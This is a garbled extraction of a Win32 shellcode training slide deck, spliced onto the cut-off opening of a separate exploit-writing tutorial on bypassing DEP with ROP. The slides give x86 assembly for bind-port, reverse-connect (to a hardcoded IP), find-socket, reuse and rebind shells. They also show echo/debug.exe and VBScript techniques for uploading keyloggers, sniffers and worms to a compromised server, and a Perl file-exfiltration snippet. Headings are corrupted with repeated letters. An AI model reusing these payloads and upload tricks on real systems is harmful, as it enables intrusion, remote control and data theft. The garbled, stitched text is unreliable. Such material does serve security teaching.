;GetProcAddress()\n\fG\nG\nG\nGe\ne\ne\net\nt\nt\ntt\nt\nt\nti\ni\ni\nin\nn\nn\nng\ng\ng\ng o\no\no\not\nt\nt\nth\nh\nh\nhe\ne\ne\ner\nr\nr\nr f\nf\nf\nfu\nu\nu\nun\nn\nn\nnc\nc\nc\nct\nt\nt\nti\ni\ni\nio\no\no\non\nn\nn\nns\ns\ns\ns b\nb\nb\nby\ny\ny\ny\nn\nn\nn\nna\na\na\nam\nm\nm\nme\ne\ne\ne\n\u2022 Set ESI to Function name, EDI to store the addr\n\u2022 Move ECX to number of function to load\n\u2022 Call loadaddr\nmov edi,esi\nxor ecx,ecx\nmov cl,3\ncall loadaddr\nloadaddr:\nmov al,byte ptr [esi]\ninc esi\ntest al,al\njne loadaddr\npush ecx\npush edx\npush esi\npush ebx\ncall edx\npop edx\npop ecx\nstosd\nloop loadaddr\nret\n\fS\nS\nS\nSp\np\np\npa\na\na\naw\nw\nw\nwn\nn\nn\nni\ni\ni\nin\nn\nn\nng\ng\ng\ng a\na\na\na s\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nl (\n(\n(\n(1\n1\n1\n1)\n)\n)\n)\n\u2022 Set up STARTUPINFO\n\u2022 Standard input\/output\/err will be\nredirected\n\u2022 Call CreateProcess() to launch cmd.exe\n\fS\nS\nS\nSp\np\np\npa\na\na\naw\nw\nw\nwn\nn\nn\nni\ni\ni\nin\nn\nn\nng\ng\ng\ng a\na\na\na s\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nl (\n(\n(\n(2\n2\n2\n2)\n)\n)\n)\nmov byte ptr [ebp],44h ;STARTUPINFO size\nmov dword ptr [ebp+3Ch],ebx ;output handler\nmov dword ptr [ebp+38h],ebx ;input handler\nmov dword ptr [ebp+40h],ebx ;error handler\n;STARTF_USESTDHANDLES |STARTF_USESHOWWINDOW\nmov word ptr [ebp+2Ch],0101h\nlea eax,[ebp+44h]\npush eax\npush ebp\npush ecx\npush ecx\npush ecx\ninc ecx\npush ecx\ndec ecx\npush ecx\npush ecx\npush esi\npush ecx\ncall dword ptr [edi-28] ;CreateProcess\n\fD\nD\nD\nDe\ne\ne\nem\nm\nm\nmo\no\no\no\n\u2022 Building a shellcode (bind.asm)\n\u2013 Writing\n\u2013 Compiling\n\u2013 Hex editing\n\fT\nT\nT\nTh\nh\nh\nhe\ne\ne\ne C\nC\nC\nCo\no\no\non\nn\nn\nnn\nn\nn\nne\ne\ne\nec\nc\nc\nct\nt\nt\nti\ni\ni\nio\no\no\non\nn\nn\nn\n\u2022 To get interactive, the shellcode must\nsomehow setup a channel to allow us to\nsend command as well as receive output\nfrom the shell\n\u2022 Three known techniques:\n\u2013 Bind to port\n\u2013 Reverse connection\n\u2013 Find socket\n\fB\nB\nB\nBi\ni\ni\nin\nn\nn\nnd\nd\nd\nd t\nt\nt\nto\no\no\no p\np\np\npo\no\no\nor\nr\nr\nrt\nt\nt\nt s\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne (\n(\n(\n(1\n1\n1\n1)\n)\n)\n)\n\u2022 Setup a socket to bind to a specific port and\nlistening for connection\n\u2022 Upon accepting connection, spawn a new shell\n\u2013 WSASocket()\n\u2013 bind()\n\u2013 listen()\n\u2013 accept()\n\u2022 Exploits: slxploit.c, aspcode.c, asp_brute.c\n\fB\nB\nB\nBi\ni\ni\nin\nn\nn\nnd\nd\nd\nd t\nt\nt\nto\no\no\no p\np\np\npo\no\no\nor\nr\nr\nrt\nt\nt\nt s\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne (\n(\n(\n(2\n2\n2\n2)\n)\n)\n)\nBuffer Overflow\nServer\nAttack vulnerable service\nAttacker connect to port\nN to get shell\nAttacker Shellcode binds to\nport N\n\fB\nB\nB\nBi\ni\ni\nin\nn\nn\nnd\nd\nd\nd t\nt\nt\nto\no\no\no p\np\np\npo\no\no\nor\nr\nr\nrt\nt\nt\nt s\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\ni\ni\ni\nim\nm\nm\nmp\np\np\npl\nl\nl\nle\ne\ne\nem\nm\nm\nme\ne\ne\nen\nn\nn\nnt\nt\nt\nta\na\na\nat\nt\nt\nti\ni\ni\nio\no\no\non\nn\nn\nn\nmov ebx,eax\nmov word ptr [ebp],2\nmov word ptr [ebp+2],5000h ;port\nmov dword ptr [ebp+4], 0 ;IP\npush 10h\npush ebp\npush ebx\ncall dword ptr [edi-12] ;bind\ninc eax\npush eax\npush ebx\ncall dword ptr [edi-8] ;listen (soc, 1)\npush eax\npush eax\npush ebx\ncall dword ptr [edi-4] ;accept\nResult:\n435 bytes Bind to\nport shellcode that\nwill work with any\nservice pack\n(bind.asm)\n\fD\nD\nD\nDe\ne\ne\nem\nm\nm\nmo\no\no\no\n\u2022 Testing Bind to port shellcode using a\ntesting program (testskode)\n\fP\nP\nP\nPr\nr\nr\nro\no\no\nob\nb\nb\nbl\nl\nl\nle\ne\ne\nem\nm\nm\nm w\nw\nw\nwi\ni\ni\nit\nt\nt\nth\nh\nh\nh b\nb\nb\nbi\ni\ni\nin\nn\nn\nnd\nd\nd\nd t\nt\nt\nto\no\no\no p\np\np\npo\no\no\nor\nr\nr\nrt\nt\nt\nt\ns\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\n\u2022 Firewall usually block all ports except for listening port of the service\nblock in on $EXTIF from any to any\npass in log quick on $EXTIF inet proto {tcp,udp} from any to $HTTP port =\nhttp flags S keep state\nBuffer Overflow\nServer\nAttack vulnerable service\nAttacker connect\nto port N blocked\nby firewall\nAttacker Shellcode binds to\nport N\n\fR\nR\nR\nRe\ne\ne\nev\nv\nv\nve\ne\ne\ner\nr\nr\nrs\ns\ns\nse\ne\ne\ne C\nC\nC\nCo\no\no\non\nn\nn\nnn\nn\nn\nne\ne\ne\nec\nc\nc\nct\nt\nt\nt\nS\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne (\n(\n(\n(1\n1\n1\n1)\n)\n)\n)\n\u2022 Create a new socket\n\u2022 Connection to an IP and port specified in\nthe shellcode\n\u2013 WSAStartup()\n\u2013 WSASocket()\n\u2013 connect()\n\u2022 Exploits: jill.c, iis5asp_exp.c, sqludp.c,\niis5htr_exp.c\n\fR\nR\nR\nRe\ne\ne\nev\nv\nv\nve\ne\ne\ner\nr\nr\nrs\ns\ns\nse\ne\ne\ne C\nC\nC\nCo\no\no\non\nn\nn\nnn\nn\nn\nne\ne\ne\nec\nc\nc\nct\nt\nt\nt\nS\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne (\n(\n(\n(2\n2\n2\n2)\n)\n)\n)\nBuffer Overflow\nAttack vulnerable service\nServer\nAttacker Shellcode creates\na new socket\nServer connect to\nAttacker and\nspawn a shell\n\fR\nR\nR\nRe\ne\ne\nev\nv\nv\nve\ne\ne\ner\nr\nr\nrs\ns\ns\nse\ne\ne\ne C\nC\nC\nCo\no\no\non\nn\nn\nnn\nn\nn\nne\ne\ne\nec\nc\nc\nct\nt\nt\nt S\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\nI\nI\nI\nIm\nm\nm\nmp\np\np\npl\nl\nl\nle\ne\ne\nem\nm\nm\nme\ne\ne\nen\nn\nn\nnt\nt\nt\nta\na\na\nat\nt\nt\nti\ni\ni\nio\no\no\non\nn\nn\nn\npush eax\npush eax\npush eax\npush eax\ninc eax\npush eax\ninc eax\npush eax\ncall dword ptr [edi-8] ;WSASocketA\nmov ebx,eax\nmov word ptr [ebp],2\nmov word ptr [ebp+2],5000h ;port\nmov dword ptr [ebp+4], 2901a8c0h ;IP\npush 10h\npush ebp\npush ebx\ncall dword ptr [edi-4] ;connect\nResult:\n384 bytes Reverse\nconnection shellcode\n(reverse.asm)\n\fD\nD\nD\nDe\ne\ne\nem\nm\nm\nmo\no\no\no\n\u2022 Exploit can change the IP and port using:\n\u2013 *(unsigned int *)&reverse[0x12f] = resolve(argv[1]) ^\n0x96969696;\n\u2013 *(unsigned short *)&reverse[0x12a] = htons(atoi(argv[2])) ^\n0x9696;\n\u2022 Using reverse connect shellcode in\nJRun\/ColdFusion Heap based Buffer\noverflow (weiwei.pl)\n\fP\nP\nP\nPr\nr\nr\nro\no\no\nob\nb\nb\nbl\nl\nl\nle\ne\ne\nem\nm\nm\nm w\nw\nw\nwi\ni\ni\nit\nt\nt\nth\nh\nh\nh r\nr\nr\nre\ne\ne\nev\nv\nv\nve\ne\ne\ner\nr\nr\nrs\ns\ns\nse\ne\ne\ne c\nc\nc\nco\no\no\non\nn\nn\nnn\nn\nn\nne\ne\ne\nec\nc\nc\nct\nt\nt\nt\ns\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\n\u2022 Firewall usually block all outgoing\nconnection from DMZ\nblock out log on $EXTIF from any to any\nBuffer Overflow\nAttack vulnerable service\nServer\nAttacker Shellcode creates\na new socket\nReverse connect\nblocked by\nfirewall\n\fO\nO\nO\nOn\nn\nn\nne\ne\ne\ne-\n-\n-\n-W\nW\nW\nWa\na\na\nay\ny\ny\ny S\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\n\u2022 Firewall blocks all ports except for listening port\nof the service\n\u2022 Firewall blocks all outgoing connection from\nDMZ server\n\u2022 One way shellcode:\n\u2013 Find socket\n\u2013 Reuse socket\n\u2013 Rebind socket\n\u2013 Command execution\n\u2013 Others\n\fF\nF\nF\nFi\ni\ni\nin\nn\nn\nnd\nd\nd\nd s\ns\ns\nso\no\no\noc\nc\nc\nck\nk\nk\nke\ne\ne\net\nt\nt\nt s\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne (\n(\n(\n(1\n1\n1\n1)\n)\n)\n)\n\u2022 Find and use existing connection\n\u2013 Loop to find the socket descriptor of the current connection\n\u2013 Identify current connection by comparing destination port\n\u2013 Once found, bind it to a shell\n\u2022 However, socket may not be a non-overlapping\nsocket\n\u2022 Thus, we cant use it directly as in\/out\/err\nhandler in CreateProcess()\n\u2022 Using anonymous pipe\n\fF\nF\nF\nFi\ni\ni\nin\nn\nn\nnd\nd\nd\nd s\ns\ns\nso\no\no\noc\nc\nc\nck\nk\nk\nke\ne\ne\net\nt\nt\nt s\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne (\n(\n(\n(2\n2\n2\n2)\n)\n)\n)\nBuffer Overflow\nAttack vulnerable service\nServer\nAttacker Shellcode loops\nto find current\nsocket\ndescriptor\nShellcode reuse\ncurrent\nconnection to\nspawn a shell\n\fxor ebx,ebx\nmov bl,80h\nfind:\ninc ebx\nmov dword ptr [ebp],10h\nlea eax,[ebp]\npush eax\nlea eax,[ebp+4]\npush eax\npush ebx ;socket\ncall dword ptr [edi-4] ;getpeername\ncmp word ptr [ebp+6],1234h ;myport\njne find\nfound:\npush ebx ;socket\nF\nF\nF\nFi\ni\ni\nin\nn\nn\nnd\nd\nd\nd s\ns\ns\nso\no\no\noc\nc\nc\nck\nk\nk\nke\ne\ne\net\nt\nt\nt s\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\ni\ni\ni\nim\nm\nm\nmp\np\np\npl\nl\nl\nle\ne\ne\nem\nm\nm\nme\ne\ne\nen\nn\nn\nnt\nt\nt\nta\na\na\nat\nt\nt\nti\ni\ni\nio\no\no\non\nn\nn\nn\nResult: 579 bytes Reuse socket shellcode\nthat uses anonymous pipe (findsock.asm)\n\fD\nD\nD\nDe\ne\ne\nem\nm\nm\nmo\no\no\no\n\u2022 Using reuse socket shellcode in MS SQL\nServer HelloBug (hellobug.pl)\n\fP\nP\nP\nPr\nr\nr\nro\no\no\nob\nb\nb\nbl\nl\nl\nle\ne\ne\nem\nm\nm\nm w\nw\nw\nwi\ni\ni\nit\nt\nt\nth\nh\nh\nh f\nf\nf\nfi\ni\ni\nin\nn\nn\nnd\nd\nd\nd s\ns\ns\nso\no\no\noc\nc\nc\nck\nk\nk\nke\ne\ne\net\nt\nt\nt\ns\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\n\u2022 Socket is no longer available in most\nheap based buffer overflow in Win32\n\u2022 For example:\n\u2013 iis5asp_exp.c, iis5htr_exp.c, weiwei.pl\n\fR\nR\nR\nRe\ne\ne\neu\nu\nu\nus\ns\ns\nse\ne\ne\ne s\ns\ns\nso\no\no\noc\nc\nc\nck\nk\nk\nke\ne\ne\net\nt\nt\nt s\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne (\n(\n(\n(1\n1\n1\n1)\n)\n)\n)\n\u2022 Create a socket, use setsockopt() to reuse address,\nbind a shell directly to the existing service port:\n\u2013 WSASocketA()\n\u2013 setsockopt()\n\u2013 bind()\n\u2013 listen()\n\u2013 accept()\n\u2022 The next connection to the service will return a shell\n\u2022 In Win32, any user may bind to any port, even < 1024\n\fR\nR\nR\nRe\ne\ne\neu\nu\nu\nus\ns\ns\nse\ne\ne\ne s\ns\ns\nso\no\no\noc\nc\nc\nck\nk\nk\nke\ne\ne\net\nt\nt\nt s\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne (\n(\n(\n(2\n2\n2\n2)\n)\n)\n)\nBuffer Overflow\nAttack vulnerable service\nServer\nAttacker Shellcode rebinds\ncmd to same port\nAttacker connect\nvulnerable service\nagain to get shell\n\fR\nR\nR\nRe\ne\ne\neu\nu\nu\nus\ns\ns\nse\ne\ne\ne s\ns\ns\nso\no\no\noc\nc\nc\nck\nk\nk\nke\ne\ne\net\nt\nt\nt s\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\ni\ni\ni\nim\nm\nm\nmp\np\np\npl\nl\nl\nle\ne\ne\nem\nm\nm\nme\ne\ne\nen\nn\nn\nnt\nt\nt\nta\na\na\nat\nt\nt\nti\ni\ni\nio\no\no\non\nn\nn\nn\nmov word ptr [ebp],2\npush 4\npush ebp\npush 4 ;SO_REUSEADDR\npush 0ffffh\npush ebx\ncall dword ptr [edi-20] ;setsockopt\nmov word ptr [ebp+2],5000h ;port\nmov dword ptr [ebp+4], 0h ;IP\npush 10h\npush ebp\npush ebx\ncall dword ptr [edi-12] ;bind\nResult: 434 bytes reuse socket shellcode\n(reuse.asm)\n\fD\nD\nD\nDe\ne\ne\nem\nm\nm\nmo\no\no\no\n\u2022 Using Reuse socket in WebDav exploit\n(reusewb.c)\n\fP\nP\nP\nPr\nr\nr\nro\no\no\nob\nb\nb\nbl\nl\nl\nle\ne\ne\nem\nm\nm\nm w\nw\nw\nwi\ni\ni\nit\nt\nt\nth\nh\nh\nh R\nR\nR\nRe\ne\ne\neu\nu\nu\nus\ns\ns\nse\ne\ne\ne\nS\nS\nS\nSo\no\no\noc\nc\nc\nck\nk\nk\nke\ne\ne\net\nt\nt\nt\n\u2022 Some applications uses\nSO_EXCLUSIVEADDRUSE, thus reusing\nthe address is not possible\n\fR\nR\nR\nRe\ne\ne\neb\nb\nb\nbi\ni\ni\nin\nn\nn\nnd\nd\nd\nd S\nS\nS\nSo\no\no\noc\nc\nc\nck\nk\nk\nke\ne\ne\net\nt\nt\nt S\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\n(\n(\n(\n(1\n1\n1\n1)\n)\n)\n)\n\u2022 Fork a separate process\n\u2022 Forcefully terminate the vulnerable\nservice\n\u2022 The new process will bind to the port of\nthe vulnerable service\n\u2022 Connection to the same port will return a\nshell\n\fR\nR\nR\nRe\ne\ne\neb\nb\nb\nbi\ni\ni\nin\nn\nn\nnd\nd\nd\nd S\nS\nS\nSo\no\no\noc\nc\nc\nck\nk\nk\nke\ne\ne\net\nt\nt\nt S\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\n(\n(\n(\n(2\n2\n2\n2)\n)\n)\n)\n\u2022 Forking a process\n\u2013 CreateProcess() in suspend mode\n\u2013 GetThreadContext() and modify EIP\n\u2013 VirtualAllocEx()\n\u2013 WriteProcessMemory() copy shellcode to new location\n\u2013 SetThreadContext()\n\u2013 ResumeThread()\n\u2022 Forcefully termination of process\n\u2013 TerminateProcess(-1,0);\n\u2022 Binding cmd\n\u2013 Loop to bind to same port until successful\n\fR\nR\nR\nRe\ne\ne\neb\nb\nb\nbi\ni\ni\nin\nn\nn\nnd\nd\nd\nd S\nS\nS\nSo\no\no\noc\nc\nc\nck\nk\nk\nke\ne\ne\net\nt\nt\nt S\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\n(\n(\n(\n(3\n3\n3\n3)\n)\n)\n)\nBuffer Overflow\nAttack vulnerable service\nServer\nAttacker\nAttacker connect\nvulnerable\nservice again to\nget shell\nProcess bind to same port\nFork a process and terminate\nE\nE\nE\nEx\nx\nx\nxi\ni\ni\nit\nt\nt\nt\n\fD\nD\nD\nDe\ne\ne\nem\nm\nm\nmo\no\no\no\n\u2022 Using Rebind socket in WebDav exploit\n(rebindwb.c)\n\fO\nO\nO\nOt\nt\nt\nth\nh\nh\nhe\ne\ne\ner\nr\nr\nr O\nO\nO\nOn\nn\nn\nne\ne\ne\ne-\n-\n-\n-W\nW\nW\nWa\na\na\nay\ny\ny\ny S\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\n\u2022 Brett Moore\u2019s 91 byte shellcode\n\u2013 Bind CMD to every socket descriptor\n\u2022 XFocus\u2019s send again shellcode\n\u2013 send(\u201cey4s\u201d,\u2026) after buffer overflow\n\u2013 Set each socket descriptor to non-blocking\n\u2013 recv(\u2026) to check for \u201cey4s\u201d, spawn CMD\n\u2013 Loop if not true\n\u2022 Command execution shellcode\n\u2013 No socket require\n\u2013 CreateProcess()\n\u2013 250 Bytes + Command length\n\fD\nD\nD\nDe\ne\ne\nem\nm\nm\nmo\no\no\no\n\u2022 RPC-DCOM Remote Command\nExecution Exploit\n\u2013 Dcomx.c\n\fT\nT\nT\nTr\nr\nr\nra\na\na\nan\nn\nn\nns\ns\ns\nsf\nf\nf\nfe\ne\ne\ner\nr\nr\nrr\nr\nr\nri\ni\ni\nin\nn\nn\nng\ng\ng\ng f\nf\nf\nfi\ni\ni\nil\nl\nl\nle\ne\ne\ne u\nu\nu\nus\ns\ns\nsi\ni\ni\nin\nn\nn\nng\ng\ng\ng\ns\ns\ns\nsh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne\n\u2022 We may need to upload local exploit, key\nlogger, sniffer, enterprise worm, remote exploits\nto attack other servers\n\u2022 Possible to use ftp\/tftp client to upload file\n\u2013 ftp \u2013s:script\n\u2013 tftp \u2013i myserver GET file.exe\n\u2022 If firewall is in the way we still can reconstruct\nbinary file from command line\u2026\n\fU\nU\nU\nUp\np\np\npl\nl\nl\nlo\no\no\noa\na\na\nad\nd\nd\ndi\ni\ni\nin\nn\nn\nng\ng\ng\ng f\nf\nf\nfi\ni\ni\nil\nl\nl\nle\ne\ne\ne w\nw\nw\nwi\ni\ni\nit\nt\nt\nth\nh\nh\nh\nd\nd\nd\nde\ne\ne\neb\nb\nb\nbu\nu\nu\nug\ng\ng\ng.\n.\n.\n.e\ne\ne\nex\nx\nx\nxe\ne\ne\ne\n\u2022 Reconstructing binary using debug.exe\n1\n. Create a script containing debug\u2019s command with \u201cecho\u201d\ncommand\n2\n. Direct the script to debug.exe\n\u2022 Problem: Cannot create file bigger that 64k\nC:\\>echo nbell.com>b.s\nC:\\>echo a>>b.s\nC:\\>echo dw07B8 CD0E C310>>b.s\nC:\\>echo.>>b.s\nC:\\>echo R CX>>b.s\nC:\\>echo 6 >>b.s\nC:\\>echo W>>b.s\nC:\\>echo Q>>b.s\nC:\\>debug<b.s\n\f\u2022 Reconstructing binary using Visual Basic Script\n(.VBS)\n1\n.Create a VBS script that will read hex code\nfrom a file and rewrite it as binary\n2\n.Upload the script to target using \u201cecho\u201d\ncommand\n3\n.Read file to be uploaded, and \u201cecho\u201d the hex\ncode to the target server\n4\n.Run the VBS script to translate hex code to\nbinary\nU\nU\nU\nUp\np\np\npl\nl\nl\nlo\no\no\noa\na\na\nad\nd\nd\ndi\ni\ni\nin\nn\nn\nng\ng\ng\ng f\nf\nf\nfi\ni\ni\nil\nl\nl\nle\ne\ne\ne w\nw\nw\nwi\ni\ni\nit\nt\nt\nth\nh\nh\nh V\nV\nV\nVB\nB\nB\nBS\nS\nS\nS (\n(\n(\n(1\n1\n1\n1)\n)\n)\n)\n\fU\nU\nU\nUp\np\np\npl\nl\nl\nlo\no\no\noa\na\na\nad\nd\nd\ndi\ni\ni\nin\nn\nn\nng\ng\ng\ng f\nf\nf\nfi\ni\ni\nil\nl\nl\nle\ne\ne\ne w\nw\nw\nwi\ni\ni\nit\nt\nt\nth\nh\nh\nh V\nV\nV\nVB\nB\nB\nBS\nS\nS\nS (\n(\n(\n(2\n2\n2\n2)\n)\n)\n)\nSet arr = WScript.Arguments\nSet wsf = CreateObject(\"Scripting.FileSystemObject\")\nSet infile = wsf.opentextfile(arr(arr.Count-2), 1, TRUE)\nSet file = wsf.opentextfile(arr(arr.Count-1), 2, TRUE)\ndo while infile.AtEndOfStream = false\nline = infile.ReadLine\nFor x = 1 To Len(line)-2 Step 2\nthebyte = Chr(38) & \"H\" & Mid(line, x, 2)\nfile.write Chr(thebyte)\nNext\nloop\nfile.close\ninfile.close\n\fD\nD\nD\nDo\no\no\now\nw\nw\nwn\nn\nn\nnl\nl\nl\nlo\no\no\noa\na\na\nad\nd\nd\ndi\ni\ni\nin\nn\nn\nng\ng\ng\ng F\nF\nF\nFi\ni\ni\nil\nl\nl\nle\ne\ne\ne\n\u2022 Translate file into base64\n\u2022 Use \u201ctype\u201d to show the file\n\u2022 Capture output and save as base64 file\nprint SOCKET \"base64 -e $file outhex2.txt\\n\";\nreceive();\nprint SOCKET \"type outhex2.txt\\n\";\nopen(RECV, \">$file.b64\");\nprint RECV receive();\n\fD\nD\nD\nDe\ne\ne\nem\nm\nm\nmo\no\no\no\n\u2022 File transfer without additional connection\n\fE\nE\nE\nEn\nn\nn\nnd\nd\nd\nd o\no\no\nof\nf\nf\nf S\nS\nS\nSh\nh\nh\nhe\ne\ne\nel\nl\nl\nll\nl\nl\nlc\nc\nc\nco\no\no\nod\nd\nd\nde\ne\ne\ne?\n?\n?\n?\n\u2022 Advance payload:\n\u2013 CORE Security\n\u2022 Syscall Proxying (http:\/\/www.blackhat.com\/html\/bh-usa-02\/bh-usa-\n02-speakers.html#Maximiliano Caceres)\n\u2022 Inlineegg (http:\/\/oss.coresecurity.com\/projects\/inlineegg.html)\n\u2013 LSD-Planet (http:\/\/www.hivercon.com\/hc02\/talk-lsd.htm)\n\u2013 Eeye (http:\/\/www.blackhat.com\/html\/win-usa-03\/win-usa-03-\nspeakers.html#Riley Hassel)\n\u2013 Dave Aitel (http:\/\/www.immunitysec.com\/MOSDEF\/)\n\u2013 Alexander E. Cuttergo (Impurity)\n\fQ\nQ\nQ\nQ &\n&\n&\n& A\nA\nA\nA\nQ\nQ\nQ\nQ &\n&\n&\n& A\nA\nA\nA\nT\nT\nT\nTh\nh\nh\nha\na\na\nan\nn\nn\nnk\nk\nk\nk Y\nY\nY\nYo\no\no\nou\nu\nu\nu!\n!\n!\n!\nT\nT\nT\nTh\nh\nh\nha\na\na\nan\nn\nn\nnk\nk\nk\nk Y\nY\nY\nYo\no\no\nou\nu\nu\nu!\n!\n!\n!\n\f"}
{"text":"#[1]Corelan Cybersecurity Research \u00bb Feed [2]Corelan Cybersecurity\nResearch \u00bb Comments Feed [3]Corelan Cybersecurity Research \u00bb Exploit\nwriting tutorial part 10 : Chaining DEP with ROP \u2013 the Rubik\u2019s[TM] Cube\nComments Feed [4]alternate [5]alternate [6]alternate\n[7]Corelan Cybersecurity Research\n:: Knowledge is not an object, it's a flow ::\n* [8]Home\n*\n* [9]Articles\n*\n* [10]Free Tools\n+ [11]AD & CS\no [12]AD Disable Users\no [13]Certificate List Utility\no [14]PVE Find AD User\n+ [15]Exchange Transport Agents\no [16]Attachment filter\no [17]Attachment rename\n+ [18]Networking\no [19]Cisco switch backup utility\no [20]Network monitoring with powershell\no [21]TCP Ping\n+ [22]Security Related Tools\n*\n* [23]Security\n+ [24]Corelan Team Members\no [25]Corelan Team Membership\n+ [26]Corelan Training \"Corelan Live\u2026\n+ [27]Exploit writing tutorials\n+ [28]Metasploit\no [29]FTP Client fuzzer\no [30]HTTP Form field fuzzer\no [31]Simple FTP Fuzzer \u2013 Metasploit\u2026\n+ [32]Nessus\/Openvas ike-scan wrapper\n+ [33]Vulnerability Disclosure Policy\n+ [34]mona.py PyCommand for Immunity Debugger\no [35]Download mona.py\no [36]Mona.py \u2013 documentation\n+ [37]Corelan ROPdb\n+ [38]Mirror for BoB\u2019s Immunity Debugger\u2026\n*\n* [39]Terms of use\n*\n* [40]Donate\n*\n* [41]About\u2026\n+ [42]About Corelan Team\n+ [43]About me\n+ [44]Antivirus\/antimalware\n+ [45]Corelan public keys\n+ [46]Sitemap\n\u00ab [47]Offensive Security Hacking Tournament \u2013 How strong was my fu ?\n[48]How strong is your fu : Hacking for charity \u00bb\nPlease consider donating: [49]https:\/\/www.corelan.be\/index.php\/donate\/\n195,634 views\nExploit writing tutorial part 10 : Chaining DEP with ROP \u2013 the Rubik\u2019s[TM]\nCube\nPublished June 16, 2010 | By [50]Peter Van Eeckhoutte (corelanc0d3r)\nTable of Contents\n* [51]Introduction\n* [52]Hardware DEP in the Win32 world\n* [53]Bypassing DEP \u2013 Building blocks\n+ [54]What are our options ?\n+ [55]The gadget\n+ [56]Windows function calls to bypass DEP\n+ [57]Choose your weapon\n+ [58]Function parameters & usage tips\n+ [59]ROP Exploit transportability\n* [60]From EIP to ROP\n+ [61]Direct RET\n+ [62]SEH based\n+ [63]Before we begin\n* [64]Direct RET \u2013 The ROP version \u2013 VirtualProtect()\n+ [65]Time to ROP \u2018n ROLL\n+ [66]How to build the chain (chaining basics)\n+ [67]Finding ROP gadgets\n+ [68]\"CALL register\" gadgets\n+ [69]Gotcha. But how\/where exactly do I start ?\n+ [70]Test before you start\n+ [71]Everybody stay cool, this is a roppery\n* [72]Direct RET \u2013 ROP Version 2 \u2013 NtSetInformationProcess()\n* [73]Direct RET \u2013 ROP Version 3 \u2013 SetProcessDEPPolicy()\n* [74]Direct RET \u2013 ROP Version 4 \u2013 ret-to-libc : WinExec()\n* [75]SEH Based \u2013 The ROP version \u2013 WriteProcessMemory()\n+ [76]Triggering the bug\n+ [77]Stack pivoting\n+ [78]ROP NOP\n+ [79]Building the ROP chain \u2013 WriteProcessMemory()\n* [80]Egg hunters\n+ [81]Scenario 1 : patch the egg hunter\n+ [82]Scenario 2 : prepend the shellcode\n* [83]Unicode\n* [84]ASLR and DEP ?\n+ [85]The theory\n+ [86]An example\n* [87]Other literature on DEP \/ Memory protection bypass\n* [88]Questions ?\n* [89]Thanks to\nIntroduction\n[90]tutorial About 3 months after finishing my previous [91]exploit\nwriting related tutorial, I finally found some time and fresh energy to\nstart writing a new article.\nIn the previous tutorials, I have explained the basics of stack based\noverflows and how they can lead to arbitrary code execution.  I\ndiscussed [92]direct RET overflows, [93]SEH based exploits, [94]Unicode\nand [95]other character restrictions, the use of [96]debugger plugins\nto speed up exploit development, how to [97]bypass common memory\nprotection mechanisms and how to [98]write your own shellcode.\nWhile the first tutorials were really written to allow people to learn\nthe basics about exploit development, starting from scratch (basically\ntargeting people who don\u2019t have any knowledge about exploit\ndevelopment), you have most likely discovered that the more recent\ntutorials continue to build on those basics and require solid knowledge\nof [99]asm, [100]creative [101]thinking, and some experience with\nexploit writing in general.\nToday\u2019s tutorial is no different. I will continue to build upon\neverything we have seen and learned in the previous tutorials. This has\na couple of consequences :\n1. You really need to master stack based overflow exploitation\ntechniques (direct RET, SEH,etc).  I 